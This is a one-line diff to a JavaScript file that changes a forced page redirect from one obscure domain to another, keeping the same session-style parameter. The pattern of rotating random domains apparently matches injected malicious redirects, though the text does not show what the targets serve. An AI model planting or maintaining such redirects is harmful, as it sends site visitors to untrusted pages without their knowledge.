@@ -1,1 +1,1 @@
-window.location.href = "https://dismast.top/FLQX/go?sid=7744";
+window.location.href = "https://chlorka.xyz/YLeA/go?sid=7744";
